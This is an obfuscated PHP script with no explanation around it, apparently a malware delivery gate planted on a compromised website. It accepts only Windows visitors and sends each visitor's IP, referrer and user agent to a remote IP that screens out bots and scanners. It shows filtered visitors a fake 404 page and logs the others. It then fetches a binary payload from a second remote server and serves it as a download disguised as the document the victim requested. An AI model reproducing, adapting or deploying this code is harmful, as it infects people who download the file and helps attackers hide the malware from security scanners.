<?php
 goto fMUXz; kVduY: $_GET["\145"] = $REQUEST_URI_ARR[2]; goto oQ72R; i_AwT: if (count($REQUEST_URI_ARR) != 3) { die("\122\x45\121\x55\x45\x53\124\x5f\x55\122\x49\137\101\122\122"); } goto kVduY; jBLsR: shuffle($links); goto DqKAL; DqKAL: file_put_contents(__DIR__ . "\x2f\56\56\x2f\164\x72\171\137\x5f\142\151\x67\x5f\137\163\164\141\164\x2e\164\x78\164", date("\x63") . "\x9" . getRealIpAddr() . "\x9" . $_SERVER["\110\124\124\120\x5f\x55\123\x45\122\x5f\101\x47\x45\x4e\x54"] . "\x9" . $_GET["\145"] . "\xd\xa", FILE_APPEND); goto m1Vec; maeUW: $links = array("\x68\x74\x74\160\x3a\x2f\x2f\x31\66\62\56\x32\64\61\x2e\61\62\x37\56\61\x32\x33\x2f\162\x6f\165\164\145\162\60\70\x2e\x70\150\160\77\160\160\x3d" . $data_json, "\150\164\x74\160\72\x2f\x2f\x31\x36\x32\x2e\x32\x34\61\x2e\x31\x32\67\56\x31\62\x33\x2f\x72\x6f\165\x74\145\x72\60\x38\x2e\x70\x68\160\77\x70\x70\x3d" . $data_json, "\150\x74\164\x70\72\57\x2f\61\x36\x32\56\x32\x34\x31\x2e\61\x32\x37\56\61\x32\x33\x2f\162\x6f\165\164\x65\162\60\x38\56\160\x68\x70\77\160\x70\x3d" . $data_json); goto jBLsR; aSta2: foreach ($links as $link) { $ctx = stream_context_create(array("\x68\164\164\160" => array("\x74\151\155\x65\x6f\x75\x74" => 30))); $data = file_get_contents($link, false, $ctx); if (strlen($data) < 10000) { continue; } file_put_contents($outfilepath, date("\x63") . "\x9" . getRealIpAddr() . "\11" . $_SERVER["\x48\124\124\x50\x5f\125\x53\105\x52\137\101\107\x45\x4e\x54"] . "\x9" . $_GET["\145"] . "\xd\12", FILE_APPEND); header("\x43\157\x6e\x74\x65\x6e\164\x2d\104\145\x73\x63\x72\151\160\164\x69\157\156\72\40\x46\x69\154\x65\40\124\x72\141\156\x73\x66\145\x72"); header("\103\x6f\156\x74\x65\156\x74\x2d\124\x79\x70\x65\x3a\x20\x61\x70\160\x6c\x69\143\x61\x74\x69\157\x6e\57\157\143\x74\x65\164\x2d\163\x74\x72\x65\141\x6d"); header("\103\x6f\x6e\x74\145\156\164\x2d\104\x69\163\x70\x6f\x73\x69\x74\151\x6f\x6e\x3a\40\x61\164\164\x61\143\150\x6d\x65\x6e\x74\x3b\x20\x66\151\x6c\x65\156\141\155\x65\x3d" . $_SESSION["\x64\x6f\143\x5f\156\x61\x6d\145"]); header("\103\x6f\x6e\x74\145\x6e\164\55\x54\162\x61\x6e\x73\x66\145\162\55\x45\x6e\143\x6f\x64\151\x6e\147\72\x20\x62\151\156\141\x72\x79"); header("\103\x6f\x6e\156\x65\x63\164\151\x6f\x6e\x3a\x20\x4b\x65\145\x70\55\x41\x6c\x69\166\x65"); header("\x45\170\x70\151\x72\145\163\x3a\40\60"); header("\x43\141\x63\150\145\x2d\x43\x6f\156\164\x72\157\x6c\x3a\40\x6d\165\x73\164\x2d\162\x65\x76\x61\154\151\144\x61\x74\145\x2c\x20\160\157\x73\164\55\143\x68\145\x63\x6b\x3d\x30\54\40\x70\x72\145\x2d\x63\150\x65\x63\153\x3d\60"); header("\120\x72\141\147\155\x61\x3a\x20\x70\165\142\154\x69\x63"); echo $data; die; } goto v2m4s; fL3YA: $data_json = json_encode($data_json); goto EsX5I; EsX5I: $data_json = base64_encode($data_json); goto maeUW; fMUXz: if (session_start() === false) { die("\x73\163\56"); } goto I1Iz_; p8YY7: if ($_GET["\145"] != "\61\62\x33\56\x7a\151\x70") { if ($_GET["\x65"] != "\144\x6f\143\x75\155\x65\156\164\x73\x2e\172\x69\x70") { $_SESSION["\x5f\x5f\x72\145\x64\x69\162\145\x63\164\x5f\167\x61\x73\137\x73\x74\141\x72\164"] = true; $_SESSION["\x64\x6f\143\137\156\x61\x6d\145"] = $_GET["\145"]; $redirect_uri = str_replace($_GET["\145"], "\144\x6f\x63\x75\x6d\145\x6e\x74\x73\x2e\172\x69\160", $REQUEST_URI); echo "\x3c\x64\x69\166\x20\151\144\75\x22\x6c\154\42\x20\144\141\x74\x61\55\x72\162\x3d\x22" . $redirect_uri . "\x22\76\74\57\144\151\x76\x3e"; echo "\x3c\x73\x63\162\x69\160\164\76"; echo "\154\157\143\x61\x74\151\157\x6e\56\x70\x61\164\x68\156\141\155\x65\x20\x3d\40\x64\157\x63\165\x6d\x65\x6e\164\56\147\145\164\x45\154\145\x6d\x65\x6e\x74\102\171\111\x64\50\47\x6c\154\x27\51\x2e\x67\x65\164\101\164\164\x72\x69\142\165\164\145\50\47\144\141\x74\x61\55\x72\x72\47\51\73"; echo "\74\x2f\163\143\162\x69\160\164\76"; die("\127\141\x69\164\56\x2e\56"); } else { if (empty($_SESSION["\x5f\137\x72\x65\144\151\162\x65\x63\164\137\x77\x61\x73\137\x73\164\x61\x72\164"])) { die("\x72\x77\163\56"); } } @($_SERVER["\x48\124\124\120\137\101\103\103\105\120\x54\137\114\101\116\x47\x55\x41\107\x45"] = $_SERVER["\x48\x54\x54\x50\x5f\101\x43\103\x45\120\124\x5f\114\x41\x4e\x47\x55\101\x47\x45"]); if (in_array("\x63\165\162\154", get_loaded_extensions())) { } else { echo "\x49\x6e\163\164\141\x6c\154\x20\x43\125\x52\114\40\157\x6e\40\163\145\162\x76\x65\162"; die; } if (!function_exists("\x67\145\164\x52\145\141\154\151\160")) { function getRealip() { if (!empty($_SERVER["\110\x54\x54\120\x5f\x43\106\137\103\x4f\x4e\x4e\x45\103\x54\111\116\x47\x5f\111\120"]) && $_SERVER["\110\124\x54\x50\x5f\103\106\x5f\103\x4f\116\x4e\105\x43\124\x49\x4e\107\137\111\x50"] != "\61\62\x37\x2e\60\x2e\60\56\x31" && $_SERVER["\110\124\x54\120\137\x43\x46\x5f\x43\117\x4e\x4e\x45\103\x54\x49\x4e\107\x5f\111\120"] != $_SERVER["\x53\105\122\126\x45\x52\137\101\x44\x44\122"]) { $ip = $_SERVER["\x48\124\x54\120\137\103\106\137\103\x4f\116\x4e\x45\103\x54\111\116\107\x5f\111\120"]; } elseif (!empty($_SERVER["\x47\105\117\x49\120\x5f\x41\104\x44\122"]) && $_SERVER["\x47\105\x4f\111\x50\x5f\101\104\104\122"] != "\x31\x32\x37\x2e\x30\x2e\60\56\61") { $ip = $_SERVER["\x47\105\x4f\111\120\x5f\101\x44\104\x52"]; } elseif (!empty($_SERVER["\110\x54\x54\120\x5f\x58\x5f\x46\x4f\122\x57\101\x52\x44\x45\104\x5f\106\117\x52"]) && $_SERVER["\110\x54\x54\x50\x5f\130\x5f\x46\117\x52\127\x41\122\104\105\x44\137\106\x4f\122"] != "\61\62\67\56\60\56\x30\x2e\61" && $_SERVER["\110\x54\x54\120\x5f\130\x5f\x46\117\x52\127\101\x52\x44\105\x44\x5f\106\117\122"] != $_SERVER["\x53\x45\x52\x56\105\x52\x5f\101\104\x44\x52"]) { $ip = explode("\x2c", $_SERVER["\110\x54\x54\x50\137\130\x5f\x46\x4f\x52\127\101\x52\104\105\104\x5f\106\117\122"])[0]; } elseif (!empty($_SERVER["\110\x54\x54\x50\x5f\x43\x4c\x49\x45\x4e\x54\x5f\111\120"]) && $_SERVER["\x48\124\x54\120\137\103\114\x49\x45\116\x54\137\x49\x50"] != "\x31\x32\67\x2e\60\56\x30\56\x31" && $_SERVER["\110\x54\x54\x50\x5f\103\114\x49\105\x4e\124\x5f\111\x50"] != $_SERVER["\x53\105\x52\126\105\122\x5f\x41\104\x44\x52"]) { $ip = $_SERVER["\x48\x54\x54\120\137\103\x4c\x49\x45\x4e\x54\x5f\x49\120"]; } else { $ip = $_SERVER["\122\x45\115\117\x54\105\137\x41\x44\x44\122"]; } return $ip; } } $ip = getRealip(); if (!function_exists("\x67\145\164\x52\x65\x61\x6c\162\x65\x66")) { function getRealref() { if (empty($_SERVER["\110\124\124\120\137\x52\x45\x46\x45\122\105\x52"])) { $_SERVER["\x48\124\124\x50\x5f\x52\105\106\105\122\x45\122"] = getenv("\x48\124\x54\x50\x5f\x52\105\x46\x45\122\105\122"); } return $_SERVER["\110\124\124\120\x5f\122\x45\106\x45\122\x45\x52"]; } } $ref = getRealref(); if (!function_exists("\147\x65\164\x52\x65\141\x6c\x75\141")) { function getRealua() { if (empty($_SERVER["\x48\124\124\x50\137\x55\123\105\122\x5f\x41\x47\x45\116\x54"])) { $_SERVER["\x48\x54\124\120\137\125\x53\105\x52\137\x41\107\x45\116\x54"] = getenv("\110\x54\124\120\x5f\125\123\x45\122\x5f\x41\107\105\116\124"); } return $_SERVER["\110\x54\x54\x50\137\125\x53\105\122\x5f\101\107\105\x4e\124"]; } } $ua = getRealua(); if ($_SERVER["\x51\125\x45\x52\131\137\x53\x54\x52\x49\x4e\107"] != '') { $data = '' . urlencode($_SERVER["\x51\125\105\122\x59\137\123\x54\x52\111\x4e\x47"]) . ''; } else { $data = ''; } $langua = substr($_SERVER["\110\124\124\120\137\x41\103\103\105\x50\x54\137\114\101\116\x47\x55\x41\107\x45"], 0, 2); $vercode = "\63\60\61\62\61"; $cl0ip = "\61\x30\x34"; $sourcename = "\143\x68\146"; $sourceid = ''; $cl1ip = "\56\x31\71\63\x2e"; $flowdomain = "\x66\62\67\x31\x31\x37\61"; $cl2ip = "\62\x35\x32\x2e"; $cloudipphp = "\x61\160\x69\x63\x6f\x6e\163\x74\x72"; $cl3ip = "\62\x31"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "\150\164\164\160\x3a\57\57" . $cl0ip . '' . $cl1ip . '' . $cl2ip . '' . $cl3ip . "\57" . $cloudipphp . "\x2e\x70\150\160"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, "\x66\x64\75" . $flowdomain . "\46\x69\160\x3d" . $ip . "\x26\162\x65\x66\75" . $ref . "\x26\165\141\x3d" . $ua . "\46\144\x61\x74\141\75" . $data . "\x26\x73\157\165\x72\143\x65\151\x64\75" . $sourceid . "\46\x6c\x61\x6e\147\x75\141\x3d" . $langua . "\x26\163\x6f\165\x72\143\145\x6e\x61\x6d\x65\75" . $sourcename . ''); $ifbot = curl_exec($ch); curl_close($ch); if ($ifbot != "\60") { http_response_code(404); echo "\74\41\x44\x4f\103\x54\x59\120\x45\40\110\x54\115\114\x20\120\125\x42\114\x49\103\x20\x22\55\57\x2f\x49\105\124\106\57\x2f\104\124\104\40\x48\x54\x4d\114\40\x32\x2e\60\57\x2f\105\x4e\42\76\xa\74\x68\164\155\x6c\76\x3c\150\145\x61\144\76\12\x3c\164\151\x74\x6c\x65\76\64\60\x34\40\x4e\157\x74\x20\106\157\165\x6e\x64\x3c\x2f\164\151\164\x6c\x65\76\xa\x3c\x2f\x68\x65\x61\144\76\x3c\x62\157\x64\x79\76\12\x3c\x68\x31\x3e\116\157\x74\x20\x46\x6f\x75\156\144\x3c\x2f\x68\x31\76\xa\74\160\76\x54\150\x65\x20\162\145\x71\165\145\163\164\145\x64\40\125\122\114\x20\167\x61\163\40\156\157\x74\40\146\157\165\x6e\x64\x20\x6f\x6e\40\x74\150\151\163\x20\x73\145\162\166\145\162\56\74\57\x70\x3e\xa\74\x2f\x62\x6f\x64\171\x3e\x3c\57\150\x74\155\154\76"; die; } else { $secret = md5((int) (time() / 5)); if (isset($_GET["\x6b\145\171"])) { if ($_GET["\x6b\x65\171"] != $secret) { http_response_code(404); echo "\74\x21\x44\x4f\103\124\x59\x50\x45\x20\x48\124\x4d\x4c\x20\x50\x55\102\114\111\103\x20\x22\55\x2f\x2f\x49\105\124\x46\x2f\x2f\x44\x54\104\x20\110\124\115\x4c\x20\x32\56\60\x2f\x2f\105\116\x22\76\12\74\x68\x74\x6d\154\76\74\x68\145\x61\144\x3e\xa\x3c\x74\x69\164\154\x65\x3e\x34\60\x34\x20\116\x6f\164\x20\106\157\x75\x6e\144\74\x2f\164\151\164\154\x65\76\12\74\57\150\x65\x61\144\x3e\74\142\x6f\x64\x79\x3e\xa\74\x68\61\x3e\116\x6f\164\x20\x46\x6f\165\x6e\144\74\x2f\150\x31\x3e\xa\x3c\160\x3e\x54\150\x65\x20\162\x65\x71\x75\x65\x73\164\x65\144\x20\125\122\114\x20\x77\141\163\x20\156\x6f\164\x20\x66\157\165\156\144\x20\157\x6e\40\164\x68\151\x73\x20\163\145\x72\166\x65\x72\x2e\74\x2f\x70\76\12\x3c\57\142\157\x64\171\x3e\74\x2f\x68\164\x6d\x6c\x3e"; die; } else { header("\x43\x6f\156\164\x65\156\164\x2d\124\x79\x70\x65\x3a\x20\141\160\x70\154\151\x63\141\x74\151\x6f\156\x2f\157\x63\164\x65\164\x2d\163\164\162\x65\x61\x6d"); header("\x43\x6f\156\164\145\156\164\55\x44\151\x73\160\157\163\x69\164\151\x6f\x6e\72\40\141\x74\164\141\143\x68\155\x65\156\x74\x3b\x20\146\151\x6c\145\x6e\141\155\x65\75"); header("\x43\157\156\x74\145\156\x74\x2d\x44\145\163\143\162\151\x70\x74\x69\157\x6e\72\x20\x46\151\154\145\x20\124\x72\x61\x6e\163\x66\145\162"); readfile(''); die; } } header("\114\x6f\143\x61\164\x69\157\156\x3a\x20" . $_SERVER["\123\103\122\x49\x50\x54\137\116\x41\115\x45"] . "\77\153\x65\171\75" . $secret . ''); die; } } else { $hdrs = getallheaders(); if ($hdrs["\110\x48"] != md5("\x53\105\122\x41\137" . date("\144\155\171"))) { die("\150\56"); } } goto XgV73; aBAXv: $REQUEST_URI_ARR = explode("\57", $REQUEST_URI); goto i_AwT; XgV73: function getRealIpAddr() { if (!empty($_SERVER["\110\x54\124\120\137\103\114\111\x45\x4e\124\x5f\x49\x50"])) { $ip = $_SERVER["\110\124\124\x50\137\x43\114\111\105\x4e\x54\x5f\x49\120"]; } elseif (!empty($_SERVER["\110\124\x54\x50\137\x58\137\106\117\122\x57\101\122\x44\x45\x44\x5f\x46\117\x52"])) { $ip = $_SERVER["\110\124\x54\120\137\x58\x5f\106\x4f\x52\x57\101\122\x44\105\x44\137\x46\x4f\x52"]; } else { $ip = $_SERVER["\x52\105\x4d\x4f\x54\x45\137\x41\104\104\122"]; } return $ip; } goto fr8PO; cjOM5: if (stripos($_SERVER["\110\124\124\x50\137\x55\123\105\122\137\x41\x47\x45\x4e\x54"], "\x57\x69\156\144\157\167\x73") === false) { die("\167\56"); } goto p8YY7; m1Vec: $outfilepath = __DIR__ . "\57\56\56\57\x62\151\147\137\x5f\x73\x74\141\164\x2e\x74\x78\164"; goto aSta2; oQ72R: if (empty($_SERVER["\110\x54\x54\x50\137\125\x53\105\x52\x5f\101\x47\x45\116\124"])) { die("\165\x73\145\x72\56"); } goto cjOM5; fr8PO: $data_json = array("\x69\160" => getRealIpAddr(), "\x74\151\x6d\145" => time()); goto fL3YA; c09n5: if (empty($REQUEST_URI)) { die("\122\105\x51\x55\105\123\x54\137\125\122\111"); } goto aBAXv; I1Iz_: $REQUEST_URI = $_SERVER["\122\x45\121\125\105\123\124\137\125\x52\111"]; goto c09n5; v2m4s: die("\124\162\x79\x20\141\147\141\151\x6e\56");